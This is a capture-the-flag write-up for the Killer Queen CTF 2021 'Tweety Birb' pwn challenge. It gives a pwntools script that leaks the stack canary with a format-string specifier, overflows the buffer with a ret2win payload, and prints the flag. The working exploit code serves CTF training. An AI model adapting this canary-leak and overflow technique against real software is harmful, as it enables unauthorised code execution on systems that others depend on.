---
name: Tweety Birb (2021)
event: Killer Queen CTF 2021
category: Pwn
description: Writeup for Tweety Birb (pwn) - Killer Queen CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Tweety Birb

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/xOHLniVJsJY/0.jpg)](https://youtu.be/xOHLniVJsJY?t=2382s "Killer Queen 2021: Tweety Birb")

## Challenge Description

> Pretty standard birb protection

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x4011de
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './tweetybirb'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 72  # IP offset
ret = 0x40101a  # Stack alignment

# Leak canary value (15th on stack)
io.sendlineafter('magpies?', '%{}$p'.format(15))
io.recvline()
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

payload = flat([
    offset * asm('nop'),
    canary,
    8 * asm('nop'),
    ret,
    elf.symbols.win
])

# Send the payload
io.sendlineafter('fowl?', payload)
io.recvline()

# Get our flag!
flag = io.recv()
success(flag)
```
{% endcode %}

Flag: `kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}`
